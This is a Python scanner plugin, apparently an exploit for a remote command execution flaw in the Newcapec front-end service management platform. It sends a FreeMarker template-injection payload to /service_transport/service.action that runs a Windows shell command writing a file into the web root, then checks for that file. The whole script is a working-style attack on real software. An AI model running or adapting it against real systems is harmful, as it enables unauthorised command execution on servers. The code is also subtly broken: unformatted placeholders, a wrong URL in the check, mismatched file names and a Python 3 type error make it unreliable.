#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '新开普前置服务管理平台 service.action 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(8)
  r1 = randomLowercase(15)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/service_transport/service.action'
  data = '''{"command":"GetFZinfo","UnitCode":"<#assign ex = \\"freemarker.template.utility.Execute\\"?new()>${ex(\\"cmd /c echo {r1} > ./webapps/ROOT/{r0}.txt\\")}"}'''
  url1 = url + target
  # ret['url'] = url1
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if resp.status_code == 200 and re.search(r'"_result":',resp.text,re.S):
        resp.close()
    else:
      return ret
  except:
    return ret
  try:
    payload = url + f'/{r1}.txt'
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and bytes(r1) in res.text:
      ret['url'] = payload
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret